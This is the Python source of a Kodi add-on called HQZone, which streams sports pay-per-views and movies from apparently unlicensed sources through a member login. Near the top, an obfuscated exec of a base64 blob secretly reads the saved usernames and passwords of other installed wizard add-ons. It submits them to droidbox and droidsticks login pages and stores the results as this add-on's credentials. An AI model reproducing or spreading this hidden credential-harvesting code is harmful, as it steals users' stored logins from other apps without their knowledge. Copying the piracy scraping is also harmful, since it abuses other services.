import base64,urllib,urllib2,re,cookielib,string,os,xbmc, xbmcgui, xbmcaddon, xbmcplugin, random, datetime,urlparse
from t0mm0.common.net import Net as net

addon_id        = 'plugin.video.HQZone'
selfAddon       = xbmcaddon.Addon(id=addon_id)
datapath        = xbmc.translatePath(selfAddon.getAddonInfo('profile'))
fanart          = xbmc.translatePath(os.path.join('special://home/addons/' + addon_id , 'fanart.jpg'))
icon            = xbmc.translatePath(os.path.join('special://home/addons/' + addon_id, 'icon.png'))
user            = selfAddon.getSetting('hqusername')
passw           = selfAddon.getSetting('hqpassword')
cookie_file     = os.path.join(os.path.join(datapath,''), 'hqzone.lwp')
    
exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("MTkgMWUgPT0gJycgNTggMjMgPT0gJycgNTggMWUgPT0gJzNiJzoKCTE5IDRhLjJmLjM4KDIpOgoJCTRhLjVhKDIpCgk2ZToKCQkxYyA9IFsnMWIuMjIuNDUnLCAnMWIuMjIuZCcsICcxYi4yMi4zNCddCgkJNTkgMWEgM2YgMWM6CgkJCWIgPSAzNS4yYig0YS4yZi42NignNGY6Ly82My80Yy80MC8nKzFhLCAnNDguNmInKSkKCQkJMTkgNGEuMmYuMzgoYik6CgkJCQkyZCA9IDYxKGIsICc2NycpCgkJCQkxOCA9IDJkLjY5KCkKCQkJCTI2ID0gMzkuYygnPDI1IDQ3PSI0MSIgZT0iKC4rPykiJykuNCgxOClbMF0KCQkJCTI4ID0gMzkuYygnPDI1IDQ3PSIzZCIgZT0iKC4rPykiJykuNCgxOClbMF0KCQkJCTE5ICdkJyAzZiAxYToKCQkJCQk2OCA9ICcxZDovLzMxLjIwLjQ0LjVmLzMzJwoJCQkJCTczID0gJzFkOi8vMzEuMjAuNDQuNWYvNS9mLzQ3LzMvJwoJCQkJNDY6CgkJCQkJNjggPSAnMWQ6Ly8yMS40NC8yOS8zMycKCQkJCQk3MyA9ICcxZDovLzIxLjQ0LzI5LzUvZi80Ny84LycKCQkJCTNlIDY4CgkJCQkzZSA3MwoJCQkJNDMgPSAxMigpLjkoNjgpLjUKCQkJCTY3ID0gMzkuNCg2Nyc8NWMgNjU9IjUxIiAzNz0iKC4rPykiIGU9IiguKz8pIiAvPicsIDQzLCAzOS43NSkKCQkJCTc0ID0ge30KCQkJCTc0WycyYyddID0gMjYKCQkJCTc0WyczMCddID0gMjgKCQkJCTU5IDM3LCBlIDNmIDY3OgoJCQkJCTc0WzM3XSA9IGUKCQkJCQkxMigpLjkoNjgpCgkJCQkJMTIoKS40Mig2OCw3NCkKCQkJCQkxMigpLjJlKDIpCgkJCQkJMTIoKS4zYSgyKQoJCQkJCTc3ID0gMTIoKS45KDY4KQoJCTE5ICc1MiAzZiA3MCcgM2YgNzcuNToKCQkJCTc3ID0gMTIoKS45KDczKQoJCQkJMzYgPSA3Ny41CgkJCQkxZT0zOS5jKCc8Nz4oLis/KTwvNz4nKS40KDM2KVswXQoJCQkJMjM9MzkuYygnPDY+KC4rPyk8LzY+JykuNCgzNilbMF0KCTU0OgoJCTMyID0gNTAuNTUoKQoJCTU2ID0gMzIuNWUoJzE3JywgJzU3IDVkIDZhIDE3IDI0IDRlJywnNTggNDkgMTkgNmQgNjIgNjAgNzIgMjQnLCc3MSA2Yy4xNy42ZicsJzUzJywnNWInKQoJCTE5IDU2ID09IDE6CgkJCWEgPSAzNS4xZignJywgJzNjIDRkJykKCQkJYS4yNygpCgkJCTE5IChhLjExKCkpOgoJCQkJMTAgPSBhLjJhKCkKCQkJCTc9MTAKCQkJCWEgPSAzNS4xZignJywgJzNjIDRiOicpCgkJCQlhLjI3KCkKCQkJCTE5IChhLjExKCkpOgoJCQkJICAgMTAgPSBhLjJhKCkKCQkJCSAgIDY9MTAKCQkJCSAgIDc2LjE0KCcxMycsNykKCQkJCSAgIDc2LjE0KCcxNicsNikKCQk0Njo2NCgpCgkJMWUgPSA3Ni4xNSgnMTMnKQoJCTIzID0gNzYuMTUoJzE2Jyk=")))(lambda a,b:b[int("0x"+a.group(1),16)],"0|1|cookie_file|3|findall|content|password|username|8|http_GET|keyb|wizardpath|compile|droidboxwizard|value|f|search|isConfirmed|net|hqusername|setSetting|getSetting|hqpassword|HQZone|wizlog|if|addons|plugin|AddonList|http|user|Keyboard|droidbox|dswizard|video|passw|account|setting|wizuser|doModal|wizpass|amember|getText|translatePath|amember_login|wizset|save_cookies|path|amember_pass|wizard|dialog|member|UpdateWizard|xbmc|link|name|exists|re|set_cookies|Droidsticks|Enter|dspassword|print|in|addon_data|dsusername|http_POST|html|co|aswizard|else|id|settings|register|os|Password|userdata|Username|details|special|xbmcgui|hidden|Logged|Cancel|except|Dialog|ret|Please|or|for|remove|Login|input|enter|yesno|uk|have|open|dont|home|quit|type|join|r|amemberurl|read|your|xml|www|you|try|Tv|as|at|an|hqpass|post_data|I|selfAddon|response".split("|")))
      
#############################################################################################################################
def announce():
    try:
        response = net().http_GET('http://pastebin.com/raw.php?i=Jp76gEmp')
        link = response.content
        link=link.replace('\n','')
        match=re.compile('<titlepop>(.+?)</titlepop>.+?<line1>(.+?)</line1>.+?<line2>(.+?)</line2>.+?<line3>(.+?)</line3>').findall(link)
        for title,line1,line2,line3 in match:
            dialog = xbmcgui.Dialog()
            dialog.ok('[COLOR red]'+title+'[/COLOR]',line1,line2,line3)
    except:pass

def Index():
    deletecachefiles()
    announce()
    setCookie('http://rarehost.net/site/member')
    response = net().http_GET('http://rarehost.net/site/member')
    if not 'Logged in as' in response.content:
        dialog = xbmcgui.Dialog()
        dialog.ok('HQZone', 'Login Error','An error ocurred logging in. Please check your details','Ensure your account is active on http://hqzone.tv')
        quit()
    link = response.content
    link = cleanHex(link)
    link=link.replace('\r','').replace('\n','').replace('\t','').replace('&nbsp;','').replace('  ','')
    addDir('[COLOR blue][B]--- View Todays Overview ---[/B][/COLOR]','http://hqzone.tv/forums/forum.php',7,icon,fanart)
    addDir('[COLOR blue][B]--- View This Weeks Schedule ---[/B][/COLOR]','http://hqzone.tv/forums/calendar.php?c=1&do=displayweek',6,icon,fanart)
    addLink(' ','url',5,icon,fanart)
    vip=re.compile('<li><a href="(.+?)">VIP Streams</a>').findall(link)
    if len(vip)>0:
        vip=vip[0]
        addDir('[COLOR gold]VIP[/COLOR] HQ Streaming Channels','http://rarehost.net/site/vip/vip.php',2,icon,fanart)
        addDir('[COLOR gold]VIP[/COLOR] HQ Video on Demand','url',4,icon,fanart)
    addLink(' ','url',5,icon,fanart)
    addLink('How to Subscribe','url',302,icon,fanart)
    addLink('[COLOR blue]Twitter[/COLOR] Feed','url',100,icon,fanart)
    addLink('HQZone Account Status','url',200,icon,fanart)
    addDir('HQ Zone Support','url',300,icon,fanart)
    addLink(' ','url',5,icon,fanart)
    response = net().http_GET('http://pastebin.com/raw.php?i=Jp76gEmp')
    link = response.content
    ticker=re.compile('<ticker>(.+?)</ticker>').findall(link)[0]
    addLink('[COLOR red][I]'+ ticker +'[/I][/COLOR]','url','mode',icon,fanart)
    xbmc.executebuiltin('Container.SetViewMode(50)')

def luckydip(url):
    response = net().http_GET(url)
    link = response.content
    link=link.replace('\r','').replace('\n','').replace('\t','').replace('&nbsp;','').replace('  ','')
    match=re.compile('<title>(.+?)</title><link>(.+?)</link>').findall(link)
    for channel,url in match:
        addLink(channel,url,53,icon,fanart)

def playluckydip(name,url):
    try:
        swf='http://p.jwpcdn.com/6/11/jwplayer.flash.swf'
        strurl=re.compile("file: '(.+?)',").findall(link)[0]
        playable = strurl+' swfUrl='+swf+' pageUrl='+url+' live=true timeout=20 token=WY846p1E1g15W7s'
        ok=True
        liz=xbmcgui.ListItem(name, iconImage=icon,thumbnailImage=icon); liz.setInfo( type="Video", infoLabels={ "Title": name } )
        ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=url,listitem=liz)
        try:
            xbmc.Player ().play(playable, liz, False)
            return ok
        except:
            pass
    except:
        ok=True
        liz=xbmcgui.ListItem(name, iconImage=icon,thumbnailImage=icon); liz.setInfo( type="Video", infoLabels={ "Title": name } )
        ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=url,listitem=liz)
        try:
            xbmc.Player().play(url, liz, False)
            return ok
        except:
            pass
         
def reqpop():
    dialog = xbmcgui.Dialog()
    dialog.ok('[COLOR blue]How to Subscribe[/COLOR]', 'Visit http://hqzone.tv','Payments Accepted - Stripe and PayPal','')    
    
def getchannels(url):
    vip = 0
    if 'vip' in url:
        baseurl = 'http://rarehost.net/site/vip/'
        vip = 1
    else:baseurl = 'http://rarehost.net/site/free/'
    setCookie('http://rarehost.net/site/member')
    response = net().http_GET(url)
    link = response.content
    link = cleanHex(link)
    link=link.replace('\r','').replace('\n','').replace('\t','').replace('&nbsp;','').replace('  ','')
    match=re.compile('<a href="(.+?)"></br><font color= "\#fff" size="\+1"><b>(.+?)</b>').findall(link)
    for url,channel in match:
        channel = channel + ':'+ ':'+ ':'+ ':'
        channel = channel.replace('</font>','').replace('Online','[COLOR limegreen]Online[/COLOR]').replace('Offline','[COLOR red]Offline[/COLOR]').replace('online','[COLOR limegreen]Online[/COLOR]').replace('offline','[COLOR red]Offline[/COLOR]')
        channel = channel.replace('**HD**','[COLOR gold]**HD**[/COLOR]').replace('**720p**','[COLOR gold]**720p**[/COLOR]')
        chsplit = channel.split(':')   
        channel = '[COLOR blue]'+chsplit[0]+'[/COLOR]'+' '+chsplit[1]+chsplit[2]
        url = baseurl+url
        addLink(channel,url,3,icon,fanart)

        
    match=re.compile("<a href='(.+?)'></br><font color= '\#fff' size='\+1'><b>(.+?)</b>").findall(link)
    print match
    for url,channel in match:
      
        channel = channel + ':'+ ':'+ ':'+ ':'
        channel = channel.replace('</font>','').replace('Online','[COLOR limegreen]Online[/COLOR]').replace('Offline','[COLOR red]Offline[/COLOR]').replace('online','[COLOR limegreen]Online[/COLOR]').replace('offline','[COLOR red]Offline[/COLOR]')
        channel = channel.replace('**HD**','[COLOR gold]**HD**[/COLOR]').replace('**720p**','[COLOR gold]**720p**[/COLOR]')
        chsplit = channel.split(':')   
        channel = '[COLOR blue]'+chsplit[0]+'[/COLOR]'+' '+chsplit[1]+chsplit[2]
        url = baseurl+url
        addLink(channel,url,3,icon,fanart)
    xbmc.executebuiltin('Container.SetViewMode(50)')


def getstreams(url,name):
    setCookie('http://rarehost.net/site/member')
    response = net().http_GET(url)
    link = response.content
    link = cleanHex(link)
    link=link.replace('\r','').replace('\n','').replace('\t','').replace('&nbsp;','').replace('  ','')
    swf='http://p.jwpcdn.com/6/11/jwplayer.flash.swf'
    strurl=re.compile("file: '(.+?)',").findall(link)[0]
    playable = strurl+' swfUrl='+swf+' pageUrl='+url+' live=true timeout=20 token=WY846p1E1g15W7s'
    ok=True
    liz=xbmcgui.ListItem(name, iconImage=icon,thumbnailImage=icon); liz.setInfo( type="Video", infoLabels={ "Title": name } )
    ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=url,listitem=liz)
    try:
        xbmc.Player ().play(playable, liz, False)
        return ok
    except:
        pass
    

def setCookie(srDomain):
    html = net().http_GET(srDomain).content
    r = re.findall(r'<input type="hidden" name="(.+?)" value="(.+?)" />', html, re.I)
    post_data = {}
    post_data['amember_login'] = user
    post_data['amember_pass'] = passw
    for name, value in r:
        post_data[name] = value
    net().http_GET('http://rarehost.net/site/member')
    net().http_POST('http://rarehost.net/site/member',post_data)
    net().save_cookies(cookie_file)
    net().set_cookies(cookie_file)

def schedule(url):
    response = net().http_GET(url)
    link = response.content
    link=link.replace('\r','').replace('\n','').replace('\t','').replace('&nbsp;','').replace('  ','')
    match=re.findall('<h3><span class=".+?">(.+?)</span><span class="daynum" style=".+?" onclick=".+?">(.+?)</span></h3><ul class="blockrow eventlist">(.+?)</ul>',link)
    for day,num,data in match:
		addLink('[COLOR blue][B]'+day+' '+num+'[/B][/COLOR]','url','mode',icon,fanart)
		match2=re.findall('<span class="eventtime">(.+?)</span><a href=".+?" title="">(.+?)</a>',data)
		for time,title in match2:
                        timeuk = time.split(' - ')
                        title = title.encode('ascii', 'ignore')
                        title = title.replace('amp;','')
			addLink('[COLOR yellow]'+time+'[/COLOR] '+title,'url','mode',icon,fanart)
    xbmc.executebuiltin('Container.SetViewMode(51)')
  
def todayschedule(url):
    response = net().http_GET(url)
    link = response.content
    match=re.compile('<li><a href=".+?">(.+?)</a>.+?</li>').findall(link)
    now = str(datetime.datetime.now().date())
    addLink('[COLOR blue][B]'+now+' '+'[/B][/COLOR]','url','mode',icon,fanart)
    for event in match:
        event = cleanHex(event)
        event = event.encode('ascii', 'ignore')
        addLink(event,'url','mode',icon,fanart)
    xbmc.executebuiltin('Container.SetViewMode(51)')


def account():
    setCookie('http://rarehost.net/site/member')
    response = net().http_GET('http://rarehost.net/site/member')
    link = response.content
    link = cleanHex(link)
    link=link.replace('\r','').replace('\n','').replace('\t','').replace('&nbsp;','').replace('  ','')
    stat = ''
    user=re.compile('<div class="am-user-identity-block">(.+?)<').findall(link)[0]
    user = user+'\n'+' '
    accnt=re.compile('<li><strong>(.+?)</strong>(.+?)</li>').findall(link)
    for one,two in accnt:
        one = '[COLOR blue]'+one+'[/COLOR]'
        stat = stat+' '+one+' '+two+'\n'
    dialog = xbmcgui.Dialog()
    dialog.ok('[COLOR blue]HQZone Account Status[/COLOR]', '',stat,'')

def support():
    addLink('Clear Cache','url',5,icon,fanart)
    addLink('Contact Us','url',301,icon,fanart)
   
def supportpop():
    dialog = xbmcgui.Dialog()
    dialog.ok('[COLOR blue]HQZone Account Support[/COLOR]', 'For account queries please contact us at:','@HQZoneTV (via Twitter)',' hqzone@hotmail.com (via Email)')
       
def vod():
    addDir('Wrestling Weeklies','http://rarehost.net/site/free/wrestlingplayer.php',8,icon,fanart)
    addDir('Wrestling PPVs','http://rarehost.net/site/vip/wrestlingppvsplayer.php',8,icon,fanart)
    addDir('MMA PPVs','http://rarehost.net/site/vip/mmappvsplayer.php',8,icon,fanart)
    addDir('Boxing PPVs','http://rarehost.net/site/vip/boxingppvsplayer.php',8,icon,fanart)
    addDir('HQ Movies','http://xmovies8.co/tag/hotnew/',50,icon,fanart)
    
def vodlisting(name,url):
    setCookie('http://rarehost.net/site/member')
    response = net().http_GET(url)
    link = response.content
    link = cleanHex(link)
    match=re.compile("playlist: '(.+?)'").findall(link)[0]
    if 'Weeklies' in name:url='http://rarehost.net/site/free/'+match
    else:url = 'http://rarehost.net/site/vip/'+match
    setCookie('http://rarehost.net/site/meember')
    response = net().http_GET(url)
    link = response.content
    link = cleanHex(link)
    match=re.compile('<title>(.+?)</title>.+?source file="(.+?)"',re.DOTALL).findall(link)
    for name,url in match:
        addLink(name,url,53,icon,fanart)
    
def getmovies(url):
        req = urllib2.Request(url)
        req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3')
        response = urllib2.urlopen(req)
        link=response.read()
        response.close()
        link=link.replace('\n','').replace('  ','')
        match=re.compile('<a class="thumbnail darken video" title="(.+?)" href="(.+?)">',re.DOTALL).findall(link)
        if len(match)>0:
                items = len(match)
                for name,url in match:
                        name2 = cleanHex(name)
                        if not 'Season' in name2:
                                if not 'SEASON' in name2:
                                        addLink(name2,url,51,icon,fanart)
        if len(match)<1:
                match=re.compile('<a class="thumbnail darken video" href="(.+?)" title="(.+?)">',re.DOTALL).findall(link)
                items = len(match)
                for url,name in match:
                        name2 = cleanHex(name)
                        if not 'Season' in name2:
                                if not 'SEASON' in name2:
                                        addLink(name2,url,51,icon,fanart)
        try:
                match=re.compile('link rel="next" href="(.+?)"').findall(link)
                url= match[0]
                addDir('Next Page>>',url,1,icon,fanart)
        except: pass
       
def playmovies(name,url):
        req = urllib2.Request(url)
        req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3')
        response = urllib2.urlopen(req)
        link=response.read()
        response.close()
        match=re.compile('<a target="_blank" rel="nofollow" href="(.+?)">.+?mp4</a>').findall(link)
        if len(match)>0:
                match = match[-1]
        else:
                match=re.compile('src="http://videomega.tv/cdn.php\?ref=(.+?)\&width=700\&height=430"').findall(link)
                if len(match)<1:
                        match=re.compile('src="http://videomega.tv/iframe.php\?ref=(.+?)"').findall(link)
                videomega_url = "http://videomega.tv/?ref=" + match[0]
                
##RESOLVE##     
                url = urlparse.urlparse(videomega_url).query
                url = urlparse.parse_qs(url)['ref'][0]
                url = 'http://videomega.tv/cdn.php?ref=%s' % url
                referer = videomega_url
                req = urllib2.Request(url,None)
                req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3')
                req.add_header('Referer', referer)
                response = urllib2.urlopen(req)
                link=response.read()
                response.close()        
                match = re.compile('<source src="(.+?)" type="video/mp4"/>').findall(link)[0]      
##RESOLVE##
        print match       
        playlist = xbmc.PlayList(1)
        playlist.clear()
        listitem = xbmcgui.ListItem(name, iconImage=icon, thumbnailImage=icon)
        listitem.setInfo("Video", {"Title":name})
        listitem.setProperty('mimetype', 'video/x-msvideo')
        listitem.setProperty('IsPlayable', 'true')
        playlist.add(match,listitem)
        xbmcPlayer = xbmc.Player(xbmc.PLAYER_CORE_AUTO)
        xbmcPlayer.play(playlist)

def addDir(name,url,mode,iconimage,fanart,description=''):
        u=sys.argv[0]+"?url="+urllib.quote_plus(url)+"&mode="+str(mode)+"&name="+urllib.quote_plus(name)+"&description="+str(description)
        ok=True
        liz=xbmcgui.ListItem(name, iconImage="DefaultFolder.png", thumbnailImage=iconimage)
        liz.setInfo( type="Video", infoLabels={ "Title": name, 'plot': description } )
        liz.setProperty('fanart_image', fanart)
        ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=True)
        return ok

def addLink(name,url,mode,iconimage,fanart,description=''):
        u=sys.argv[0]+"?url="+urllib.quote_plus(url)+"&mode="+str(mode)+"&name="+urllib.quote_plus(name)+"&description="+str(description)
        ok=True
        liz=xbmcgui.ListItem(name, iconImage="DefaultFolder.png", thumbnailImage=iconimage)
        liz.setInfo( type="Video", infoLabels={ "Title": name, 'plot': description } )
        liz.setProperty('fanart_image', fanart)
        ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=False)
        return ok
    
def cleanHex(text):
    def fixup(m):
        text = m.group(0)
        if text[:3] == "&#x": return unichr(int(text[3:-1], 16)).encode('utf-8')
        else: return unichr(int(text[2:-1])).encode('utf-8')
    return re.sub("(?i)&#\w+;", fixup, text.decode('ISO-8859-1').encode('utf-8'))

def notification(title, message, ms, nart):
    xbmc.executebuiltin("XBMC.notification(" + title + "," + message + "," + ms + "," + nart + ")")

def showText(heading, text):
    id = 10147
    xbmc.executebuiltin('ActivateWindow(%d)' % id)
    xbmc.sleep(100)
    win = xbmcgui.Window(id)
    retry = 50
    while (retry > 0):
        try:
            xbmc.sleep(10)
            retry -= 1
            win.getControl(1).setLabel(heading)
            win.getControl(5).setText(text)
            return
        except:
            pass

def twitter():
        text = ''
        twit = 'https://script.google.com/macros/s/AKfycbyBcUa5TlEQudk6Y_0o0ZubnmhGL_-b7Up8kQt11xgVwz3ErTo/exec?560773938943627264'
        response = net().http_GET(twit)
        link = response.content
        link = link.replace('/n','')
        link = link.encode('ascii', 'ignore').decode('ascii').decode('ascii').replace('&#39;','\'').replace('&#xA0;','').replace('&#x2026;','')
        match=re.compile("<title>(.+?)</title>.+?<pubDate>(.+?)</pubDate>",re.DOTALL).findall(link)[1:]
        for status, dte in match:
            dte = dte[:-15]
            dte = '[COLOR blue][B]'+dte+'[/B][/COLOR]'
            text = text+dte+'\n'+status+'\n'+'\n'
        showText('[COLOR blue][B]@HQZoneTv[/B][/COLOR]', text)
        quit()

def deletecachefiles():
    xbmc_cache_path = os.path.join(xbmc.translatePath('special://home'), 'cache')
    if os.path.exists(xbmc_cache_path)==True:    
        for root, dirs, files in os.walk(xbmc_cache_path):
            file_count = 0
            file_count += len(files)
            if file_count > 0:
                    for f in files:
                        try:
                            os.unlink(os.path.join(root, f))
                        except:
                            pass
                    for d in dirs:
                        try:
                            shutil.rmtree(os.path.join(root, d))
                        except:
                            pass
    if xbmc.getCondVisibility('system.platform.ATV2'):
        atv2_cache_a = os.path.join('/private/var/mobile/Library/Caches/AppleTV/Video/', 'Other')
        for root, dirs, files in os.walk(atv2_cache_a):
            file_count = 0
            file_count += len(files)
            if file_count > 0:
                    for f in files:
                        os.unlink(os.path.join(root, f))
                    for d in dirs:
                        shutil.rmtree(os.path.join(root, d))
        atv2_cache_b = os.path.join('/private/var/mobile/Library/Caches/AppleTV/Video/', 'LocalAndRental')
        for root, dirs, files in os.walk(atv2_cache_b):
            file_count = 0
            file_count += len(files)
            if file_count > 0:    
                    for f in files:
                        os.unlink(os.path.join(root, f))
                    for d in dirs:
                        shutil.rmtree(os.path.join(root, d))
    if mode == 5:
        dialog = xbmcgui.Dialog()
        dialog.ok("[COLOR blue]Delete Cache[/COLOR]", "All Done", "")

def get_params():
        param=[]
        paramstring=sys.argv[2]
        if len(paramstring)>=2:
                params=sys.argv[2]
                cleanedparams=params.replace('?','')
                if (params[len(params)-1]=='/'):
                        params=params[0:len(params)-2]
                pairsofparams=cleanedparams.split('&')
                param={}
                for i in range(len(pairsofparams)):
                        splitparams={}
                        splitparams=pairsofparams[i].split('=')
                        if (len(splitparams))==2:
                                param[splitparams[0]]=splitparams[1]
                                
        return param
              
params=get_params(); url=None; name=None; mode=None; iconimage=None
try:url=urllib.unquote_plus(params["url"])
except:pass
try:name=urllib.unquote_plus(params["name"])
except:pass
try:mode=int(params["mode"])
except:pass
try:iconimage=urllib.unquote_plus(params["iconimage"])
except:pass

print "Mode: "+str(mode); print "Name: "+str(name); print "Thumb: "+str(iconimage)
if mode==None or url==None or len(url)<1:Index()

elif mode==2:getchannels(url)
elif mode==3:getstreams(url,name)
elif mode==4:vod()
elif mode==5:deletecachefiles()
elif mode==6:schedule(url)
elif mode==7:todayschedule(url)
elif mode==8:vodlisting(name,url)

elif mode==50:getmovies(url)
elif mode==51:playmovies(name,url)
elif mode==52:luckydip(url)
elif mode==53:playluckydip(name,url)


elif mode==100:twitter()
elif mode==200:account()

elif mode==300:support()
elif mode==301:supportpop()
elif mode==302:reqpop()


        
xbmcplugin.endOfDirectory(int(sys.argv[1]))
